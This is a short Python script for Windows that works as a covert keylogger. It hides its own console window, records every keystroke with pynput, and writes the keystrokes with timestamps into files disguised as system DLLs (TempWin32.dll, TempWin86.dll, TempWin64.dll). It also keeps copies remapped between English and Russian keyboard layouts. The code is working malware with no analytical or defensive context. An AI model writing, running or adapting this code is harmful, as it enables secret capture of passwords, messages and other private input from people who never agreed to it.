from pynput.keyboard import Listener, Key
import win32gui
import win32console
from datetime import datetime

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

eng = """~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>? \n"""
rus = """ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ, \n"""


def key_pressed(key):
    key = str(key).replace("'", "")
    key = str(key).replace("Key.space", " ")
    key = str(key).replace("Key.backspace", "-bsp")
    key = str(key).replace("<96>", "0")
    key = str(key).replace("<97>", "1")
    key = str(key).replace("<98>", "2")
    key = str(key).replace("<99>", "3")
    key = str(key).replace("<100>", "4")
    key = str(key).replace("<101>", "5")
    key = str(key).replace("<102>", "6")
    key = str(key).replace("<103>", "7")
    key = str(key).replace("<104>", "8")
    key = str(key).replace("<105>", "9")
    key = str(key).replace("Key.enter", "\n" + "\n" + datetime.utcnow().strftime("%d %m %Y %H:%M:%S") + "\n" + "\n")
    if key.find("Key.") == -1:
        with open("TempWin32.dll", "at") as f:
            f.write(key)
        with open("TempWin86.dll", "at") as F:
            if key in eng:
                key = str(key).replace(key, rus[eng.find(key)])
            F.write(key)
        with open("TempWin64.dll", "at") as ff:
            if key in rus:
                key = str(key).replace(key, eng[rus.find(key)])
            ff.write(key)


def key_released(key):
    if key == Key.f7:
        return False


with Listener(on_press=key_pressed, on_released=key_released, ) as listener:
    listener.join()
